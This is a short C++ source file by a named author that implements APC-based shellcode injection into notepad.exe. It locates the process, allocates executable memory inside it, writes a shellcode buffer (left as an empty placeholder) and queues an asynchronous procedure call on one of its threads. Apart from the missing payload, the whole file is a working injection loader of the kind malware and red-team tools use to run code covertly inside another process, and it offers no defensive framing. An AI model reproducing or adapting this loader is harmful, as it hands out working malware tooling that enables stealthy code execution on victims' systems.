// Filename: threadless_injection.cpp
// Description: Shellcode execution using APC queueing instead of thread creation
// Author: Joas A Santos

#include <windows.h>
#include <iostream>
#include <tlhelp32.h>

DWORD GetPID(const std::wstring& name) {
    PROCESSENTRY32W entry = { sizeof(entry) };
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD pid = 0;
    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (name == entry.szExeFile) {
                pid = entry.th32ProcessID;
                break;
            }
        } while (Process32NextW(snapshot, &entry));
    }
    CloseHandle(snapshot);
    return pid;
}

int wmain() {
    DWORD pid = GetPID(L"notepad.exe");
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    unsigned char shellcode[] = {
        // Your shellcode here
    };

    WriteProcessMemory(hProcess, remoteBuffer, shellcode, sizeof(shellcode), NULL);

    // Find a thread in target process
    THREADENTRY32 te = { sizeof(te) };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    DWORD tid = 0;

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                tid = te.th32ThreadID;
                break;
            }
        } while (Thread32Next(snap, &te));
    }

    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
    QueueUserAPC((PAPCFUNC)remoteBuffer, hThread, NULL);

    std::cout << "[+] APC Shellcode queued. Wait for thread to enter alertable state.\n";
    return 0;
}
